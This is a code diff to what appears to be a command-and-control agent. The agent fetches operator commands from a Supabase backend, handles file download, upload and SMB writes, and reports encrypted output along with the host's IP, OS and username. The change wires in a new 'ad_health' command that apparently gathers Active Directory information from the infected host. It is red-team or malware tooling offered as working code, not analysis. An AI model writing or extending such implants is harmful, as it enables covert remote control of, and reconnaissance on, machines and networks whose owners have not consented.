@@ -9,6 +9,7 @@ from .file_operations import handle_download_command, handle_upload_command, fet
 from .system_info import get_system_info
 from .config import supabase, PIPE_NAME_TEMPLATE
 from .settings import fetch_settings
+from utils.winapi.ad_health import handle_ad_health_command
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
@@ -626,7 +627,6 @@ def execute_commands(agent_id):
                     output = str(e)
                 update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
 
-
             elif os.name == 'nt' and command_text.lower().startswith('writesmb '):
                 parts = command_text.split(' ')
                 if len(parts) < 3:
@@ -791,6 +791,18 @@ def execute_commands(agent_id):
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
+                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
+
+            # Add this block to handle the ad_health command
+            elif command_text.lower().startswith('ad_health'):
+                try:
+                    command_parts = command_text.split()
+                    result = handle_ad_health_command(command_parts)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
                 update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
 
             else:
